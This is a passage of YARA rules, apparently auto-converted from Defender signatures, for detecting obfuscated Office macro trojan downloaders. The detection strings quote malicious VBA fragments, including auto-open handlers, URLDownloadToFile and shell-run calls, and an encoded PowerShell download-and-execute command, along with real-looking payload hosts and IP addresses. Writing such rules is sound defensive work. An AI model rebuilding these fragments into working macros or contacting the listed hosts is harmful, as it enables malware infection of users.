        strings_accuracy = "High"
    strings:
        $x_1_1 = "=\"https://www.4sync.com/web/directdownload/kokeaq3i/w_vntpcw.341f97c5d71770e770a1043b64ec919c\"renancdt=\"c:\\users\\public\\\"urldownloadtofile0,imagemsimplescdt,renancdt&\"document.exe\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVCD_2147896608_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVCD!MTB"
        threat_id = "2147896608"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "document_close()onerrorresumenexthalleyv=halleyv+\"rgltigzsywdqz2onck9uievycm9yifjlc3vtzsbozxh0dqoncnbyb3zlchnxpsilv01vj" ascii //weight: 1
        $x_1_2 = "replace(messengertw2,\":\",vbcrlf)belongingszw0=messengertw2endfunction" ascii //weight: 1
        $x_1_3 = "belongingszw0(petrolkxo)setincomexk4=activedocument.vbproject.vbcomponents.add(1)incomexk4.codemodule.addfromstringratesxpwactivedocument.application.run" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PRN_2147898428_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PRN!MTB"
        threat_id = "2147898428"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= CreateObject(l1l1l(\"" ascii //weight: 1
        $x_1_2 = {3d 20 52 65 70 6c 61 63 65 28 6c 31 31 6c 31 31 2c 20 6c 31 6c 31 6c 28 22 [0-15] 22 2c 20 22 27 58 22 29 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = "l1ll1l = URLDownloadToFile(0," ascii //weight: 1
        $x_1_4 = "l11lll.Run Chr(34) & l11ll1 " ascii //weight: 1
        $x_1_5 = "= Array(l1l1l(\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_ZG_2147898432_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.ZG!MTB"
        threat_id = "2147898432"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {65 78 70 6c 6f 72 65 72 2e 65 78 65 20 63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c [0-32] 2e 68 74 61 22}  //weight: 1, accuracy: Low
        $x_1_2 = "Public Sub button1_Click()" ascii //weight: 1
        $x_1_3 = "= CreateObject(\"wscript.shell\")" ascii //weight: 1
        $x_1_4 = {2e 65 78 65 63 20 70 28 [0-10] 29}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 52 65 70 6c 61 63 65 28 [0-25] 2c 20 [0-30] 2c 20 [0-25] 29}  //weight: 1, accuracy: Low
        $x_1_6 = {3d 20 53 70 6c 69 74 28 70 28 66 72 6d 2e [0-10] 29 2c 20 22 20 22 29}  //weight: 1, accuracy: Low
        $x_1_7 = {28 22 3c 68 74 6d 6c 3e 3c 62 6f 64 79 3e 3c 64 69 76 20 69 64 3d 27 63 6f 6e 74 65 6e 74 27 3e 66 54 74 6c 63 32 39 73 59 79 35 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PKE_2147898433_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PKE!MTB"
        threat_id = "2147898433"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {22 43 3a 5c 55 73 65 72 73 5c 22 20 26 20 45 6e 76 69 72 6f 6e 28 22 55 73 65 72 4e 61 6d 65 22 29 20 26 20 22 5c [0-15] 5c [0-15] 22 20 2b 20 22 2e 22 20 2b 20 22 70 73 31 22}  //weight: 1, accuracy: Low
        $x_1_2 = {47 65 74 4f 62 6a 65 63 74 28 22 6e 65 77 3a [0-10] 2d [0-5] 2d [0-5] 2d [0-5] 2d [0-15] 22 29 2e 53 68 65 6c 6c 65 78 65 63 75 74 65 20 [0-32] 2e [0-32] 2e 54 61 67 2c 20 [0-32] 2e [0-32] 2e 54 61 67}  //weight: 1, accuracy: Low
        $x_1_3 = "StrReverse(\"n\" + \"e\" + \"p\" + \"o\")," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RQ_2147898475_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RQ!MTB"
        threat_id = "2147898475"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 70 70 6c 69 63 61 74 69 6f 6e 2e 53 74 61 72 74 75 70 50 61 74 68 20 26 20 [0-8] 28 22 20 49 5c 2e 2e 5c 2e 20 49 2e 22 20 26 20 22 20 49 5c 2e 2e 20 49 5c 2e 2e 20 49 5c 2e 20 49 2e 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {22 20 49 65 20 49 78 20 49 70 6c 6f 20 49 72 65 20 49 72 2e 65 20 49 78 20 49 65 20 22 29 20 26 20 43 68 72 28 [0-9] 20 2b 20 31 29 20 26 20 [0-9] 20 26 20 43 68 72 28 00 20 2b 20 31 29}  //weight: 1, accuracy: Low
        $x_1_3 = {46 72 4b 6f 6e 65 72 74 20 26 20 22 5c 22 20 26 20 4d 65 2e 4e 61 6d 65 20 26 20 [0-9] 20 26 20 22 2e [0-8] 2e 22}  //weight: 1, accuracy: Low
        $x_1_4 = {52 65 70 6c 61 63 65 28 ?? 2c 20 22 20 49 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVAX_2147898477_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVAX!MTB"
        threat_id = "2147898477"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "GetObject(Range(\"A106\").Value)" ascii //weight: 1
        $x_1_2 = "Range(\"A103\").Value + \" -\" + Range(\"A100\").Value" ascii //weight: 1
        $x_1_3 = {2e 4f 70 65 6e 28 76 30 64 66 20 2b 20 22 5c [0-10] 2e 62 61 74 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = "= Environ(\"AppData\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVCB_2147898478_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVCB!MTB"
        threat_id = "2147898478"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {67 65 74 6f 62 6a 65 63 74 28 [0-20] 29 2e 63 72 65 61 74 65 6f 62 6a 65 63 74 28 [0-20] 29 2e 72 75 6e}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 63 68 72 28 28 37 2a 32 29 2b 28 28 28 31 30 2d 34 29 2a 32 29 2a 32 29 29 26 63 68 72 28 28 28 28 31 36 2f 32 29 2a 32 29 2b 28 34 2a 35 29 29 2a 32 29 26 6d 69 64 28 [0-20] 2c 69 2b 31 2c 32 29 69 3d 69 2b 32}  //weight: 1, accuracy: Low
        $x_1_3 = {77 6f 72 6b 62 6f 6f 6b 5f 6f 70 65 6e 28 29 [0-20] 28 73 68 65 65 74 73 28 22 [0-10] 22 29 2e 72 61 6e 67 65 28 22 ?? ?? ?? ?? 22 29 2e 76 61 6c 75 65 29 2c [0-20] 28 73 68 65 65 74 73 28 22 [0-10] 22 29 2e 72 61 6e 67 65 28 22 ?? ?? ?? ?? 22 29 2e 76 61 6c 75 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVCE_2147914868_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVCE!MTB"
        threat_id = "2147914868"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "(\"fyf/hezkgeihy0ohikoztzkukutuzktkgekgyigekygh0mekvueikzeifoekztkbitkzthkubt{gq0hctg{0fujt/objebsgpdbnjvrfs00;tquui\")" ascii //weight: 1
        $x_1_2 = {3d 73 74 72 72 65 76 65 72 73 65 28 65 6e 63 29 66 6f 72 [0-5] 3d 31 74 6f 6c 65 6e 28 65 6e 63 29 [0-5] 3d 6d 69 64 28 65 6e 63 2c 00 2c 31 29 61 70 70 64 61 74 61 3d 61 70 70 64 61 74 61 26 63 68 72 28 61 73 63 28 01 29 2d 31 29 6e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_3 = "subworkbook_open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVCF_2147916615_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVCF!MTB"
        threat_id = "2147916615"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=environ(\"temp\")host=\"http://172.104.160.126:8099\"" ascii //weight: 1
        $x_1_2 = "=host+\"/payload2.txt\"mal_enc" ascii //weight: 1
        $x_1_3 = "=createobject(\"wscript.shell\")objshell.runpp,0,falseendsubsubdocument_open()mainfuncendsub" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVCG_2147917338_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVCG!MTB"
        threat_id = "2147917338"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=revenue(margin)getobject(revenue(\"146132137136130136143142085\"))" ascii //weight: 1
        $x_1_2 = "=chr(roi-27)endfunction" ascii //weight: 1
        $x_1_3 = "document_open()mymacroendsubsubautoopen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVCH_2147918770_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVCH!MTB"
        threat_id = "2147918770"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell RzNcVQ12ahwQ4s4(\"52756e444C4c33322e455845207368656c6C33322e646C6C2c5368656C6c457865635f52756e444C4C20\")" ascii //weight: 1
        $x_1_2 = "Q4s4(\"66676b6a673967726A6B396a6B67726a693339346A676b6664676a6C6c6a33\")" ascii //weight: 1
        $x_1_3 = "Chr(Int(\"&h\" & Mid(gJFVoJJO, ysGdGeV, 2)))" ascii //weight: 1
        $x_1_4 = "WorkbooK_oPen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_TZA_2147919558_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.TZA!MTB"
        threat_id = "2147919558"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "SQBFAFgAIAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAuAEkAbgB2AG8AawBlACgAJwANAAoAaAB0AHQAcA" ascii //weight: 1
        $x_1_2 = "BzADoALwAvAGYAaQByAGUAYgBhAHMAZQBzAHQAbwByAGEAZwBlAC4AZwBvAG8AZwBsAGUAYQBwAGkAcwAuAGMAbwBtAC8AdgAwAC8AYgAvAHMAcABhAG0ALQBjADIANwAzAGEALgBhAHAAcABzAHAAbwB0AC4AYwBvAG0ALwBvAC8AMQA1AC0AMAA4AC0AMgAwADIANAAuAGoAcABnAD8AYQBsAHQAPQBtAGUAZABpAGEA" ascii //weight: 1
        $x_1_3 = "MsgBox(iDxl79abC(nS04dGMwS(\"4A68752E7B275C756B76277B6F707A27686A7B707675352727\"), nS04dGMwS(\"37\")) & iDxl79abC(nS04dGMwS(\"5B697E6D285F777A736A777773284E717A7B7C70\")," ascii //weight: 1
        $x_1_4 = "Mid(JWDduK4uZ, I1PrV8sPb, 1) = Chr(Asc(Mid(JWDduK4uZ, I1PrV8sPb, 1)) - qRmYW5amD)" ascii //weight: 1
        $x_1_5 = "Public Function iDxl79abC(JWDduK4uZ As String, qRmYW5amD As Integer)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVCI_2147927530_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVCI!MTB"
        threat_id = "2147927530"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=\"6874\"'\"http\"part2=\"74703a2f2f\"'\":\\\\\"part3=\"34352e313437\"'\"45.147\"part4=\"2e3233312e3139352f6d73776f7264642e657865\"" ascii //weight: 1
        $x_1_2 = "=result&chr(\"&h\"&mid(hexstring,i,2))next" ascii //weight: 1
        $x_1_3 = "autoopen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVCJ_2147928414_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVCJ!MTB"
        threat_id = "2147928414"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "bvukwxid0gimh0dha6ly9sb2x\"encodedstring=encodedstring&\"tywqubgl2zwjsb2cznjuuy29t\"encodedstring=encodedstring&\"l3jhbnnvbxdhcmuudhh0iiani\"" ascii //weight: 1
        $x_1_2 = ".runvbcomp.name&\".downloadtwofilesfromurl\"endsubfunction" ascii //weight: 1
        $x_1_3 = "document_open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

